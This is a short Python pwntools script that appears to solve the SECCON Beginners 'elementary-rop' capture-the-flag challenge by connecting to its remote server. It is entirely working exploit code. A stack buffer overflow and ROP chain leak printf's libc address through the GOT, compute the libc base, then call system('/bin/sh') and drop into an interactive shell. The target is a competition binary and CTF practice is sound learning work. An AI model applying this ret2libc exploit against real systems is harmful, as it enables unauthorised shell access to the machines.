from pwn import *

p = remote('elementary-rop.beginners.seccon.games', 9003)
# p = process('./chall')
e = ELF('./chall')
libc = ELF('./libc.so.6')

pop_rdi = 0x40115a

payload = b'A' * 0x28
payload += p64(pop_rdi+1)
payload += p64(pop_rdi)
payload += p64(e.got['printf'])
payload += p64(e.plt['printf'])
payload += p64(e.symbols['_start'])
p.sendlineafter(b': ', payload)

libc.address = u64(p.recv(6).ljust(8, b'\0')) - libc.symbols['printf']
log.info("libc: " + hex(libc.address))

payload = b'A' * 0x28
payload += p64(pop_rdi+1)
payload += p64(pop_rdi)
payload += p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.symbols['system'])
p.sendlineafter(b': ', payload)

p.interactive()
